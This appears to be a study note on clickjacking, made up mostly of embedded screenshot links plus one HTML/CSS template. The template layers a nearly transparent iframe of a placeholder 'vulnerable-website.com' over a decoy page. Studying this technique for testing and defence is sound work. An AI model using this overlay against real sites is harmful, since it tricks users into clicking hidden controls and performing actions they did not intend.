![[Pasted image 20250205222714.png]]
![[Pasted image 20250205222915.png]]
![[Pasted image 20250205222936.png]]
```html
<head> 
<style> 
	#target_website { position:relative; width:128px; height:128px; opacity:0.00001; z-index:2; } 
	#decoy_website { position:absolute; width:300px; height:400px; z-index:1; } </style> 
</head>
... 
<body>
	<div id="decoy_website"> ...decoy web content here... </div> <iframe id="target_website" src="https://vulnerable-website.com"> </iframe>
</body>
```
![[Pasted image 20250205224005.png]]

![[Pasted image 20250206131713.png]]
![[Pasted image 20250206133131.png]]
![[Pasted image 20250206225638.png]]
![[Pasted image 20250206225733.png]]
![[Pasted image 20250206225848.png]]
![[Pasted image 20250206225944.png]]
